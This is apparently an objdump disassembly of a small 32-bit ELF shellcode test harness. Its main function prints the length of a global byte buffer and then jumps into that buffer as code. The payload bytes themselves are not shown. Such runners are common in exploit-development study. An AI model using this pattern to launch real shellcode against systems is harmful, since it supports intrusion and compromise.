
shellcode:     file format elf32-i386


Disassembly of section .init:

080482cc <_init>:
 80482cc:	53                   	push   ebx
 80482cd:	83 ec 08             	sub    esp,0x8
 80482d0:	e8 9b 00 00 00       	call   8048370 <__x86.get_pc_thunk.bx>
 80482d5:	81 c3 2b 1d 00 00    	add    ebx,0x1d2b
 80482db:	8b 83 fc ff ff ff    	mov    eax,DWORD PTR [ebx-0x4]
 80482e1:	85 c0                	test   eax,eax
 80482e3:	74 05                	je     80482ea <_init+0x1e>
 80482e5:	e8 46 00 00 00       	call   8048330 <__libc_start_main@plt+0x10>
 80482ea:	83 c4 08             	add    esp,0x8
 80482ed:	5b                   	pop    ebx
 80482ee:	c3                   	ret    

Disassembly of section .plt:

080482f0 <printf@plt-0x10>:
 80482f0:	ff 35 04 a0 04 08    	push   DWORD PTR ds:0x804a004
 80482f6:	ff 25 08 a0 04 08    	jmp    DWORD PTR ds:0x804a008
 80482fc:	00 00                	add    BYTE PTR [eax],al
	...

08048300 <printf@plt>:
 8048300:	ff 25 0c a0 04 08    	jmp    DWORD PTR ds:0x804a00c
 8048306:	68 00 00 00 00       	push   0x0
 804830b:	e9 e0 ff ff ff       	jmp    80482f0 <_init+0x24>

08048310 <strlen@plt>:
 8048310:	ff 25 10 a0 04 08    	jmp    DWORD PTR ds:0x804a010
 8048316:	68 08 00 00 00       	push   0x8
 804831b:	e9 d0 ff ff ff       	jmp    80482f0 <_init+0x24>

08048320 <__libc_start_main@plt>:
 8048320:	ff 25 14 a0 04 08    	jmp    DWORD PTR ds:0x804a014
 8048326:	68 10 00 00 00       	push   0x10
 804832b:	e9 c0 ff ff ff       	jmp    80482f0 <_init+0x24>

Disassembly of section .plt.got:

08048330 <.plt.got>:
 8048330:	ff 25 fc 9f 04 08    	jmp    DWORD PTR ds:0x8049ffc
 8048336:	66 90                	xchg   ax,ax

Disassembly of section .text:

08048340 <_start>:
 8048340:	31 ed                	xor    ebp,ebp
 8048342:	5e                   	pop    esi
 8048343:	89 e1                	mov    ecx,esp
 8048345:	83 e4 f0             	and    esp,0xfffffff0
 8048348:	50                   	push   eax
 8048349:	54                   	push   esp
 804834a:	52                   	push   edx
 804834b:	68 f0 84 04 08       	push   0x80484f0
 8048350:	68 90 84 04 08       	push   0x8048490
 8048355:	51                   	push   ecx
 8048356:	56                   	push   esi
 8048357:	68 3b 84 04 08       	push   0x804843b
 804835c:	e8 bf ff ff ff       	call   8048320 <__libc_start_main@plt>
 8048361:	f4                   	hlt    
 8048362:	66 90                	xchg   ax,ax
 8048364:	66 90                	xchg   ax,ax
 8048366:	66 90                	xchg   ax,ax
 8048368:	66 90                	xchg   ax,ax
 804836a:	66 90                	xchg   ax,ax
 804836c:	66 90                	xchg   ax,ax
 804836e:	66 90                	xchg   ax,ax

08048370 <__x86.get_pc_thunk.bx>:
 8048370:	8b 1c 24             	mov    ebx,DWORD PTR [esp]
 8048373:	c3                   	ret    
 8048374:	66 90                	xchg   ax,ax
 8048376:	66 90                	xchg   ax,ax
 8048378:	66 90                	xchg   ax,ax
 804837a:	66 90                	xchg   ax,ax
 804837c:	66 90                	xchg   ax,ax
 804837e:	66 90                	xchg   ax,ax

08048380 <deregister_tm_clones>:
 8048380:	b8 33 a1 04 08       	mov    eax,0x804a133
 8048385:	2d 30 a1 04 08       	sub    eax,0x804a130
 804838a:	83 f8 06             	cmp    eax,0x6
 804838d:	76 1a                	jbe    80483a9 <deregister_tm_clones+0x29>
 804838f:	b8 00 00 00 00       	mov    eax,0x0
 8048394:	85 c0                	test   eax,eax
 8048396:	74 11                	je     80483a9 <deregister_tm_clones+0x29>
 8048398:	55                   	push   ebp
 8048399:	89 e5                	mov    ebp,esp
 804839b:	83 ec 14             	sub    esp,0x14
 804839e:	68 30 a1 04 08       	push   0x804a130
 80483a3:	ff d0                	call   eax
 80483a5:	83 c4 10             	add    esp,0x10
 80483a8:	c9                   	leave  
 80483a9:	f3 c3                	repz ret 
 80483ab:	90                   	nop
 80483ac:	8d 74 26 00          	lea    esi,[esi+eiz*1+0x0]

080483b0 <register_tm_clones>:
 80483b0:	b8 30 a1 04 08       	mov    eax,0x804a130
 80483b5:	2d 30 a1 04 08       	sub    eax,0x804a130
 80483ba:	c1 f8 02             	sar    eax,0x2
 80483bd:	89 c2                	mov    edx,eax
 80483bf:	c1 ea 1f             	shr    edx,0x1f
 80483c2:	01 d0                	add    eax,edx
 80483c4:	d1 f8                	sar    eax,1
 80483c6:	74 1b                	je     80483e3 <register_tm_clones+0x33>
 80483c8:	ba 00 00 00 00       	mov    edx,0x0
 80483cd:	85 d2                	test   edx,edx
 80483cf:	74 12                	je     80483e3 <register_tm_clones+0x33>
 80483d1:	55                   	push   ebp
 80483d2:	89 e5                	mov    ebp,esp
 80483d4:	83 ec 10             	sub    esp,0x10
 80483d7:	50                   	push   eax
 80483d8:	68 30 a1 04 08       	push   0x804a130
 80483dd:	ff d2                	call   edx
 80483df:	83 c4 10             	add    esp,0x10
 80483e2:	c9                   	leave  
 80483e3:	f3 c3                	repz ret 
 80483e5:	8d 74 26 00          	lea    esi,[esi+eiz*1+0x0]
 80483e9:	8d bc 27 00 00 00 00 	lea    edi,[edi+eiz*1+0x0]

080483f0 <__do_global_dtors_aux>:
 80483f0:	80 3d 2f a1 04 08 00 	cmp    BYTE PTR ds:0x804a12f,0x0
 80483f7:	75 13                	jne    804840c <__do_global_dtors_aux+0x1c>
 80483f9:	55                   	push   ebp
 80483fa:	89 e5                	mov    ebp,esp
 80483fc:	83 ec 08             	sub    esp,0x8
 80483ff:	e8 7c ff ff ff       	call   8048380 <deregister_tm_clones>
 8048404:	c6 05 2f a1 04 08 01 	mov    BYTE PTR ds:0x804a12f,0x1
 804840b:	c9                   	leave  
 804840c:	f3 c3                	repz ret 
 804840e:	66 90                	xchg   ax,ax

08048410 <frame_dummy>:
 8048410:	b8 10 9f 04 08       	mov    eax,0x8049f10
 8048415:	8b 10                	mov    edx,DWORD PTR [eax]
 8048417:	85 d2                	test   edx,edx
 8048419:	75 05                	jne    8048420 <frame_dummy+0x10>
 804841b:	eb 93                	jmp    80483b0 <register_tm_clones>
 804841d:	8d 76 00             	lea    esi,[esi+0x0]
 8048420:	ba 00 00 00 00       	mov    edx,0x0
 8048425:	85 d2                	test   edx,edx
 8048427:	74 f2                	je     804841b <frame_dummy+0xb>
 8048429:	55                   	push   ebp
 804842a:	89 e5                	mov    ebp,esp
 804842c:	83 ec 14             	sub    esp,0x14
 804842f:	50                   	push   eax
 8048430:	ff d2                	call   edx
 8048432:	83 c4 10             	add    esp,0x10
 8048435:	c9                   	leave  
 8048436:	e9 75 ff ff ff       	jmp    80483b0 <register_tm_clones>

0804843b <main>:
 804843b:	8d 4c 24 04          	lea    ecx,[esp+0x4]
 804843f:	83 e4 f0             	and    esp,0xfffffff0
 8048442:	ff 71 fc             	push   DWORD PTR [ecx-0x4]
 8048445:	55                   	push   ebp
 8048446:	89 e5                	mov    ebp,esp
 8048448:	51                   	push   ecx
 8048449:	83 ec 14             	sub    esp,0x14
 804844c:	83 ec 0c             	sub    esp,0xc
 804844f:	68 a0 a0 04 08       	push   0x804a0a0
 8048454:	e8 b7 fe ff ff       	call   8048310 <strlen@plt>
 8048459:	83 c4 10             	add    esp,0x10
 804845c:	83 ec 08             	sub    esp,0x8
 804845f:	50                   	push   eax
 8048460:	68 10 85 04 08       	push   0x8048510
 8048465:	e8 96 fe ff ff       	call   8048300 <printf@plt>
 804846a:	83 c4 10             	add    esp,0x10
 804846d:	c7 45 f4 a0 a0 04 08 	mov    DWORD PTR [ebp-0xc],0x804a0a0
 8048474:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
 8048477:	ff d0                	call   eax
 8048479:	b8 00 00 00 00       	mov    eax,0x0
 804847e:	8b 4d fc             	mov    ecx,DWORD PTR [ebp-0x4]
 8048481:	c9                   	leave  
 8048482:	8d 61 fc             	lea    esp,[ecx-0x4]
 8048485:	c3                   	ret    
 8048486:	66 90                	xchg   ax,ax
 8048488:	66 90                	xchg   ax,ax
 804848a:	66 90                	xchg   ax,ax
 804848c:	66 90                	xchg   ax,ax
 804848e:	66 90                	xchg   ax,ax

08048490 <__libc_csu_init>:
 8048490:	55                   	push   ebp
 8048491:	57                   	push   edi
 8048492:	56                   	push   esi
 8048493:	53                   	push   ebx
 8048494:	e8 d7 fe ff ff       	call   8048370 <__x86.get_pc_thunk.bx>
 8048499:	81 c3 67 1b 00 00    	add    ebx,0x1b67
 804849f:	83 ec 0c             	sub    esp,0xc
 80484a2:	8b 6c 24 20          	mov    ebp,DWORD PTR [esp+0x20]
 80484a6:	8d b3 0c ff ff ff    	lea    esi,[ebx-0xf4]
 80484ac:	e8 1b fe ff ff       	call   80482cc <_init>
 80484b1:	8d 83 08 ff ff ff    	lea    eax,[ebx-0xf8]
 80484b7:	29 c6                	sub    esi,eax
 80484b9:	c1 fe 02             	sar    esi,0x2
 80484bc:	85 f6                	test   esi,esi
 80484be:	74 25                	je     80484e5 <__libc_csu_init+0x55>
 80484c0:	31 ff                	xor    edi,edi
 80484c2:	8d b6 00 00 00 00    	lea    esi,[esi+0x0]
 80484c8:	83 ec 04             	sub    esp,0x4
 80484cb:	ff 74 24 2c          	push   DWORD PTR [esp+0x2c]
 80484cf:	ff 74 24 2c          	push   DWORD PTR [esp+0x2c]
 80484d3:	55                   	push   ebp
 80484d4:	ff 94 bb 08 ff ff ff 	call   DWORD PTR [ebx+edi*4-0xf8]
 80484db:	83 c7 01             	add    edi,0x1
 80484de:	83 c4 10             	add    esp,0x10
 80484e1:	39 f7                	cmp    edi,esi
 80484e3:	75 e3                	jne    80484c8 <__libc_csu_init+0x38>
 80484e5:	83 c4 0c             	add    esp,0xc
 80484e8:	5b                   	pop    ebx
 80484e9:	5e                   	pop    esi
 80484ea:	5f                   	pop    edi
 80484eb:	5d                   	pop    ebp
 80484ec:	c3                   	ret    
 80484ed:	8d 76 00             	lea    esi,[esi+0x0]

080484f0 <__libc_csu_fini>:
 80484f0:	f3 c3                	repz ret 

Disassembly of section .fini:

080484f4 <_fini>:
 80484f4:	53                   	push   ebx
 80484f5:	83 ec 08             	sub    esp,0x8
 80484f8:	e8 73 fe ff ff       	call   8048370 <__x86.get_pc_thunk.bx>
 80484fd:	81 c3 03 1b 00 00    	add    ebx,0x1b03
 8048503:	83 c4 08             	add    esp,0x8
 8048506:	5b                   	pop    ebx
 8048507:	c3                   	ret    
